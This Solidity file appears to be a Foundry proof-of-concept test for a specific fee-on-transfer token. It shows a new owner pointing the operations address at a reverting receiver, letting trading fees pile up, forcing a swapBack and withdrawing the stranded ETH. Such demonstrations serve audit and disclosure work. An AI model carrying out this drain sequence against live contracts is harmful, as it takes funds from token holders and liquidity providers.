// Consolidated interface for the target token
interface IFoundationToken {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function setOperationsAddress(address _operationsAddress) external;
    function forceSwapBack() external;
    function withdrawStuckETH() external;
    function swapTokensAtAmount() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function enableTrading() external;
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

// Consolidated interface for the DEX Router
interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256, uint256, uint256);
}

// Contract designed to revert upon receiving ETH, controllable by the owner.
contract ControllableReverter {
    bool public shouldRevert = false;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function setRevert(bool _revert) public onlyOwner {
        shouldRevert = _revert;
    }

    fallback() external payable {
        if (shouldRevert) {
            revert("Reverting as requested");
        }
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    IFoundationToken public target = IFoundationToken(payable(TARGET));
    IDexRouter public router = IDexRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ControllableReverter public revertingReceiver;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        revertingReceiver = new ControllableReverter();

        // Grant the attacker ETH and provide initial liquidity to the DEX pair.
        deal(attacker, 100 ether);
        uint256 liquidityTokens = 10_000_000_000_000 * 1e18;
        vm.prank(target.owner());
        target.approve(address(router), liquidityTokens);

        vm.prank(attacker);
        router.addLiquidityETH{value: 50 ether}(
            address(target),
            liquidityTokens,
            0,
            0,
            attacker,
            block.timestamp
        );

        // Enable trading to allow fee collection and swaps.
        vm.prank(target.owner());
        target.enableTrading();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // 1. The original owner transfers ownership to the attacker.
        address _owner = target.owner();
        vm.prank(_owner);
        target.transferOwnership(attacker);

        // 2. The attacker, now the new owner, sets the malicious operationsAddress and arms the reverter.
        vm.startPrank(attacker);
        target.setOperationsAddress(address(revertingReceiver));
        revertingReceiver.setRevert(true);
        vm.stopPrank();

        // 3. A third-party trader buys and sells tokens to generate fees for the contract.
        address trader = makeAddr("trader");
        deal(trader, 20 ether);
        vm.startPrank(trader);

        // Trader buys tokens.
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(target);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 10 ether}(
            0, path, trader, block.timestamp
        );

        // Trader sells all tokens back, which triggers sell fees.
        uint256 traderBalance = target.balanceOf(trader);
        target.approve(address(router), traderBalance);
        path[0] = address(target);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            traderBalance, 0, path, trader, block.timestamp
        );
        vm.stopPrank();

        // 4. Attacker (as owner) executes the rest of the exploit.
        vm.startPrank(attacker);

        // Verify precondition: contract now holds enough fee tokens.
        assertTrue(target.balanceOf(address(target)) >= target.swapTokensAtAmount(), "Contract failed to accumulate enough tokens from fees.");

        // 5. Trigger the swapBack, which gets ETH stuck in the contract.
        target.forceSwapBack();

        // 6. Withdraw the stuck ETH to the attacker's address.
        target.withdrawStuckETH();
        vm.stopPrank();
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

